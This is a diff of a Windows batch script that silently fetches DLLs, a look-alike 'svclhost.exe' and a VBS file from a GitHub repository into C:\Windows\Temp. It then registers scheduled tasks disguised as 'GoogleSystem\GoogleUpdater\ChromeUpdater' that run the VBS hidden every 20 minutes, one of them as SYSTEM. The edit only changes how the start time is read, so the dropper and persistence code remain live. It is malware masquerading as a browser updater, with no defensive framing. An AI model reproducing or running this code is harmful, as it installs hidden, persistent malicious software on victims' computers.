@@ -4,7 +4,7 @@ curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssh2.dl
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.dll > C:\Windows\Temp\libssl-3.dll
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.exe > C:\Windows\Temp\svclhost.exe
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.vbs > C:\Windows\Temp\svclhost.vbs
-set tt=%time:~0,5%
+FOR /F "tokens=*" %%g IN ('time /t') do (SET tt=%%g)
 SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
 SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
 SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" >nul 2>&1
